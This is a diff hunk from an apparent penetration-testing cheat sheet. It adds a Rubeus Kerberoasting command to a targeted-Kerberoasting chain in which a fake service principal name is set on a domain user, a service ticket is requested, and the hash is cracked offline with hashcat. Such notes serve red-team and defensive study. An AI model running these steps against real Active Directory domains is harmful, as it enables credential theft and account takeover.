@@ -176,6 +176,8 @@ $SecPassword = ConvertTo-SecureString '<password>' -AsPlainText -Force
 $Cred = New-Object System.Management.Automation.PSCredential('<domain>\<user>', $SecPassword)
 <# fake SPN #>
 Set-DomainObject -Credential $Cred -Identity <specific user> -SET @{serviceprincipalname='<service class>/<host>'} -Verbose
+<# Kerberoasting #>
+.\Rubeus.exe kerberoast /user:<specific user> /nowrap
 <# password recovery #>
  .\hashcat.exe -a 0 -m 13100 .\hash .\rockyou.txt
 ```
